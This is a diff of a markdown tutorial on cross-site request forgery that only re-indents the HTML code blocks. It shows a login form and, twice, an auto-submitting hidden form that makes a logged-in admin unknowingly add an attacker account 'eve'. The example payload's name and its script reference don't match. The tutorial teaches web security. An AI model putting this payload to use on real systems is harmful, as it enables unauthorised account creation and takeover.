@@ -28,22 +28,22 @@ Essentially, it is sufficient to trick an authorized user to send a maliciously 
 ### Example 3
 * Instead of a `GET` request, the web application uses a form &mdash; and, thus, a `POST` request &mdash; to add new users:
 ```
-            <form method="post" action="http://www.server.xyz/app/admin/adduser.php">
-              Name: <input name="username"> <br>
-              Passwort: <input name="password"> <br>
-              <input type=submit value="Add User">
-            </form>
+<form method="post" action="http://www.server.xyz/app/admin/adduser.php">
+  Name: <input name="username"> <br>
+  Passwort: <input name="password"> <br>
+  <input type=submit value="Add User">
+</form>
 ```
 
 * The data sent to the application is in the `POST` request, i.e., it doesn't show in the URL. 
 * Eve prepares a malicious web page and tricks the admin to open this page
 * The web page contains a form that is auto-submitted upon opening the pages:
 ```
-            <form name="csrf" method="post" action="http://www.server.xyz/app/admin/adduser.php">
-              <input type="hidden" name="username" value="eve">
-              <input type="hidden" name="password" value="eve">
-            </form>
-            <script>document.CSRF.submit()</script>
+<form name="csrf" method="post" action="http://www.server.xyz/app/admin/adduser.php">
+  <input type="hidden" name="username" value="eve">
+  <input type="hidden" name="password" value="eve">
+</form>
+<script>document.CSRF.submit()</script>
  ```
 * The (loged in via cookie) admin opens the malicious page
 * The form is submitted automatically, as if the admin clicked on "Add User"
@@ -51,11 +51,11 @@ Essentially, it is sufficient to trick an authorized user to send a maliciously 
 * Eve prepares a malicious web page and tricks the admin to open this page
 * The web page contains a form that is auto-submitted upon opening the pages:
  ```
-            <form name="csrf" method="post" action="http://www.server.xyz/app/admin/adduser.php">
-              <input type="hidden" name="username" value="eve">
-              <input type="hidden" name="password" value="eve">
-            </form>
-            <script>document.CSRF.submit()</script>
+<form name="csrf" method="post" action="http://www.server.xyz/app/admin/adduser.php">
+  <input type="hidden" name="username" value="eve">
+  <input type="hidden" name="password" value="eve">
+</form>
+<script>document.CSRF.submit()</script>
 ```
 * The (logged in via cookie) admin opens the malicious page
 * The form is submitted automatically, as if the admin clicked on "Add User"
